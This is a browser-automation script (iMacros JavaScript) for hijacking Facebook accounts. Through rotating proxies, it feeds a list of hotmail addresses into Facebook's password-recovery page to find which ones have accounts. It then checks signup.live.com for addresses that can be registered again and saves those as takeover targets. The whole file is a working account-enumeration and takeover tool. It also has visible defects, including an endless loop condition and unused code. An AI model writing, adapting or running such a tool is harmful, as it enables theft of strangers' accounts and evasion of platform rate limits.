////////////////////////////////////////////////////////////////////////////////////////
// DEBUG: For Developers only
const EASY_DEBUG_MODE = false; //To activate built-in Debug mode for testing in iMacros Add-on and support Firefox Developer Tools for source-code changes.
const USER_AGENT_STRING = ""; //Please not that change useragent may change the whole website interface
////////////////////////////////////////////////////////////////////////////////////////
var jsLF = "\n";
var i, retcode, errtext;
var count = 0;
var windowMediator = Components.classes["@mozilla.org/appshell/window-mediator;1"]
	.getService(Components.interfaces.nsIWindowMediator);
var window = windowMediator.getMostRecentWindow("navigator:browser");
var iMacros = window.QueryInterface(imns.Ci.nsIInterfaceRequestor)
	.getInterface(imns.Ci.nsIWebNavigation)
	.QueryInterface(imns.Ci.nsIDocShellTreeItem).rootTreeItem
	.QueryInterface(imns.Ci.nsIInterfaceRequestor)
	.getInterface(imns.Ci.nsIDOMWindow).iMacros;

//For Windows paths only!!
var filename = iMacros._currentMacro.name;
var imfolder = (iMacros._currentMacro.path).match(/.(.*?).Macros./g);
var imdata = imfolder + '\\Datasources\\';
var immacros = imfolder + '\\Macros\\';

function getFileLines(file_path) {
	const CRLF = "\r\n";
	const LF = "\n";
	var lines = [];
	var file_i = imns.FIO.openNode(file_path);
	var text = imns.FIO.readTextFile(file_i);
	var eol = (text.indexOf(CRLF) == -1) ? LF : CRLF;
	lines = text.split(eol);
	eol = lines.length;
	return eol;
}

/**
 * @description This function will activate built-in iMacros Debug for every single step with more advanced algorithm to track changes
 * Also it adds a support for iMacros Developer Tools, which makes the script debug easy with a little knowledge in HTML Basics and Developer Tools.
 */
function onDebug() {
	if (EASY_DEBUG_MODE) {
	  window.console.log(`%ciMacros DEBUG MODE IS ACTIVATED`, 'background: red; color: white');
	  let first_time = 0;
	  if (!first_time) {
		iimPlayCode("SET !USERAGENT " + USER_AGENT_STRING + "\n");
		first_time = 1;
	  }
	  return "SET !SINGLESTEP YES\nSET !EXTRACT_TEST_POPUP YES\n";
	} else
	  return '';
  }

var jsLF = "\n";

//Proxy Support
var macro;
macro = "CODE:" + onDebug();
macro += "CLEAR" + jsLF;
macro += "SET !DATASOURCE proxy.txt" + jsLF;
macro += "SET !DATASOURCE_COLUMNS 2" + jsLF;
macro += "SET !DATASOURCE_LINE {{loop}}" + jsLF;
macro += "PROXY ADDRESS={{!COL1}}:{{!COL2}} BYPASS=*facebook*" + jsLF;


macro += "TAB T=1" + jsLF;
macro += "TAB CLOSEALLOTHERS" + jsLF;
macro += "SET !ERRORIGNORE YES" + jsLF;
macro += "FILTER TYPE=IMAGES STATUS=OFF" + jsLF;
macro += "URL GOTO=https://m.facebook.com/login/identify/" + jsLF;
macro += "TAG POS=1 TYPE=INPUT:TEXT FORM=ACTION:/login/identify/?ctx=recover ATTR=NAME:email CONTENT={{email}}@hotmail.com" + jsLF;
macro += "TAG POS=1 TYPE=INPUT:SUBMIT FORM=ACTION:/login/identify/?ctx=recover ATTR=*" + jsLF;
macro += "SET !EXTRACT NULL" + jsLF;
macro += "WAIT SECONDS=1.50" + jsLF;
macro += "SET !TIMEOUT_STEP 0" + jsLF;
macro += "TAG POS=1 TYPE=H2 ATTR=* EXTRACT=TXT" + jsLF;

var eN = getFileLines(imdata + '\\EmailList.txt');


var macro;
macro = "CODE:" + onDebug();
macro += "CLEAR" + jsLF;
macro += "TAB T=1" + jsLF;
macro += "TAB CLOSEALLOTHERS" + jsLF;
macro += "SET !ERRORIGNORE YES" + jsLF;
macro += "FILTER TYPE=IMAGES STATUS=OFF" + jsLF;
macro += "URL GOTO=https://m.facebook.com/login/identify/" + jsLF;
macro += "SET !DATASOURCE EmailList.txt" + jsLF;
macro += "SET !DATASOURCE_COLUMNS 1" + jsLF;
macro += "SET !DATASOURCE_LINE {{loop}}" + jsLF;
macro += "SET email {{!COL1}}" + jsLF;
macro += "TAG POS=1 TYPE=INPUT:TEXT FORM=ACTION:/login/identify/?ctx=recover ATTR=NAME:email CONTENT={{email}}@hotmail.com" + jsLF;
macro += "TAG POS=1 TYPE=INPUT:SUBMIT FORM=ACTION:/login/identify/?ctx=recover ATTR=*" + jsLF;
macro += "SET !EXTRACT NULL" + jsLF;
macro += "WAIT SECONDS=1.50" + jsLF;
macro += "SET !TIMEOUT_STEP 0" + jsLF;
macro += "TAG POS=1 TYPE=H2 ATTR=* EXTRACT=TXT" + jsLF;

var check;
check = "CODE:" + onDebug();
check += "SET !TIMEOUT_PAGE 15" + jsLF;
check += "SET !DATASOURCE EmailList.txt" + jsLF;
check += "SET !DATASOURCE_COLUMNS 1" + jsLF;
check += "SET !DATASOURCE_LINE {{loop}}" + jsLF;
check += "SET email {{!COL1}}" + jsLF;
check += "TAB OPEN" + jsLF;
check += "TAB T=2" + jsLF;
check += "SET !ERRORIGNORE YES" + jsLF;
check += "FILTER TYPE=IMAGES STATUS=ON" + jsLF;
check += "URL GOTO=https://signup.live.com/signup" + jsLF;
check += "TAG POS=1 TYPE=INPUT:TEXT FORM=ACTION:# ATTR=NAME:MemberName CONTENT={{email}}@hotmail.com" + jsLF;
check += "WAIT SECONDS=3" + jsLF;
check += "TAG POS=3 TYPE=DIV ATTR=CLASS:row EXTRACT=TXT" + jsLF;

var saveas;
saveas = "CODE:" + onDebug();
saveas += "TAB T=1" + jsLF;
saveas += "SET !DATASOURCE EmailList.txt" + jsLF;
saveas += "SET !DATASOURCE_COLUMNS 1" + jsLF;
saveas += "SET !DATASOURCE_LINE {{loop}}" + jsLF;
saveas += "SET email {{!COL1}}" + jsLF;
saveas += "SET !EXTRACT {{email}}@hotmail.com" + jsLF;
saveas += "SAVEAS TYPE=EXTRACT FOLDER=* FILE=FBAccavailable.txt" + jsLF;



for (var i = 1; 1 <= eN; i++) {
	var possible = 'abcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyz0123456789';
	var random = Math.floor((Math.random() * 9) + 4);
	var stringLength = random;

	var user = Array.apply(null, new Array(stringLength)).map(function () {
		return possible[Math.floor(Math.random() * possible.length)];
	}).join('');


	// iimSet("email", user);
	iimSet("loop", i);
	iimPlay(macro);
	var result = iimGetLastExtract();
	if (result == "Reset Password") {
		// iimSet("email", user);
		iimSet("loop", i);
		iimPlay(check);
		var status = iimGetLastExtract();
		if (status.indexOf('is available.') >= 0) {
			// iimSet("email", user);
			iimSet("loop", i);
			iimPlay(saveas);
		}
	} else if (result == "Reset Your Password") {
		// iimSet("email", user);
		iimSet("loop", i);
		iimPlay(check);
		var status = iimGetLastExtract();
		if (status.indexOf('is available.') >= 0) {
			// iimSet("email", user);
			iimSet("loop", i);
			iimPlay(saveas);
		}
	}
}